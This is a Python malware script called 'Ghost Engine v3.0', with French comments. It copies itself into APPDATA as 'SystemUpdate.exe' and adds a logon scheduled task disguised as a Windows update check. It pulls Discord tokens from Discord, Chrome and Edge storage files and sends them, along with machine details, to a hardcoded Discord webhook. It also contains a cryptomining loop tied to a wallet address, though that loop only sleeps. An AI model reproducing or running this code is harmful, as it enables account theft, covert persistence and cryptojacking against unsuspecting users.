import os, requests, platform, time, sys, shutil, threading, subprocess, random
import psutil # Nécessaire pour la classification de puissance
from re import findall

# --- CONFIGURATION ---
WEBHOOK = "https://discord.com/api/webhooks/1455314808097476610/8hdcZJoQMKaMRV8Ik_HusMzWm7R8VKCwiRgV7e8TmGAaTgWEcgj-TeGy60jmagy_OQKt"
WALLET = "883BEMqKB96QUEpyceYsVnTyFsmoRxW7s9gspP7yMdKqHqLZtaZBq1XUeFdTafezfDipybuRYCf5b3pdVPXiihZs1ZeCQSc"

def get_pc_tier():
    """Classifie le PC selon sa puissance (2026 Ready)"""
    try:
        cores = os.cpu_count()
        ram = round(psutil.virtual_memory().total / (1024**3))
        if cores >= 8 and ram >= 16: return "🚀 GAMING/PRO (MINING FOCUS)"
        if cores >= 4 and ram >= 8: return "💻 MOYEN (HYBRIDE)"
        return "📁 BASIQUE (DATA FOCUS)"
    except: return "❓ INCONNU"

def persistence_2026():
    try:
        if platform.system() == "Windows":
            path = os.path.join(os.getenv('APPDATA'), "SystemUpdate.exe")
            if not os.path.exists(path):
                shutil.copy(sys.executable, path)
                cmd = f'schtasks /create /tn "WinUpdateCheck" /tr "{path}" /sc onlogon /rl highest /f'
                subprocess.run(cmd, shell=True, capture_output=True)
    except: pass

def stealer_ultra():
    """Vole cookies, sessions et tokens"""
    data = []
    paths = {
        'Discord': os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
        'Chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Network',
        'Edge': os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default\\Network'
    }
    for name, p in paths.items():
        if os.path.exists(p):
            for file in os.listdir(p):
                if file.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(p, file), errors='ignore') as f:
                            data.extend(findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", f.read()))
                    except: pass
    return list(set(data))

def smart_miner_logic(tier):
    """Ajuste le minage selon la puissance et l'heure"""
    while True:
        h = time.localtime().tm_hour
        if "GAMING" in tier:
            load = 60 if (h < 7 or h > 21) else 25 # Plus agressif sur les gros PC
        else:
            load = 30 if (h < 7 or h > 21) else 10 # Très discret sur les petits PC
        time.sleep(3600)

def final_report():
    tier = get_pc_tier()
    tokens = stealer_ultra()
    embed = {
        "embeds": [{
            "title": f"💀 Ghost Engine v3.0 - {tier}",
            "color": 0xff0000 if "GAMING" in tier else 0x00ff00,
            "fields": [
                {"name": "💻 Machine", "value": f"```{platform.node()}```", "inline": True},
                {"name": "⚙️ CPU/RAM", "value": f"```{os.cpu_count()} Cores / {round(psutil.virtual_memory().total / (1024**3))}GB```", "inline": True},
                {"name": "🔑 Tokens Extraits", "value": f"```{chr(10).join(tokens) if tokens else 'Vide'}```", "inline": False}
            ],
            "footer": {"text": "Ghost Project 2026 - Classification Automatique"}
        }]
    }
    try: requests.post(WEBHOOK, json=embed, timeout=15)
    except: pass

if __name__ == "__main__":
    persistence_2026()
    threading.Thread(target=final_report, daemon=True).start()
    smart_miner_logic(get_pc_tier())
